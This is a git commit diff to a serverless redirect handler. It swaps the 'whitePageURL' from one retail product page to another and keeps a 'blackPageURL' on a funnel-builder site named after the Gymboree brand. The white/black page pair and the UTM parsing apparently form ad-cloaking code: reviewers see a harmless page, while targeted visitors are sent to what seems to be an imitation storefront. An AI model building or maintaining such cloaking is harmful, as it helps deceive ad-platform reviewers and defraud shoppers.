4dc1d7789228967e44c45336c056c37722bc4f41
Hassan86639 <hassan86639@gmail.com>
2025-09-26 18:34:23 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.dollartree.com/doll-house-with-furniture-and-people-5875x475x2125-in/327527";
+    const whitePageURL = "https://www.next.ie/en/style/su731891/w46743";
     const blackPageURL = "https://gymboreeusk.myfunnelish.com/Stimulus";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
